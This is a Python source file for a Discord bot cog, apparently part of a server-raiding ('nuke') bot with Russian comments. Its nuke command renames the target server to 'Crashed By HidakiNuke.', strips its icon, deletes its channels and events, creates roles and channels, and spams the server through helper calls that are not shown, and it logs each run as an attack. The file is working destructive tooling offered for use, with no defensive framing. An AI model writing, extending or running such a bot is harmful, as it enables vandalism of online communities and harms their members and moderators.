import disnake
from disnake.ext import commands
from disnake.ext.commands import BucketType, CommandOnCooldown

from ..utils.bot_operations import Fucker
from ..utils.counter import AttackCounter


class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.attack_counter = AttackCounter()

    @commands.command()
    @commands.cooldown(1, 120, BucketType.guild)  # таймаут на 120 секунд
    async def nuke(self, ctx):
        self.attack_counter.record_attack_start()

        fucker = Fucker(ctx)  # Определяем нашу недо-апишку
        await ctx.guild.edit(name="Crashed By HidakiNuke.", icon=None)
        await fucker.delChannels(ctx)
        await fucker.crRoles(ctx)
        await fucker.crChannels(ctx)
        await fucker.spam(ctx)
        await fucker.delete_events(ctx)
        await fucker.create_event(ctx)

        self.attack_counter.record_attack_end()

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, CommandOnCooldown):
            embed = disnake.Embed(
                title="Кулдаун", color=disnake.Color.from_rgb(48, 49, 54)
            )
            embed.add_field(
                name="Ошибка.",
                value=f"Команда находится на кулдауне. Повторите через {error.retry_after:.2f} секунд.",
                inline=False,
            )
            await ctx.send(embed=embed)
        else:
            raise error


def setup(bot):
    bot.add_cog(Nuke(bot))
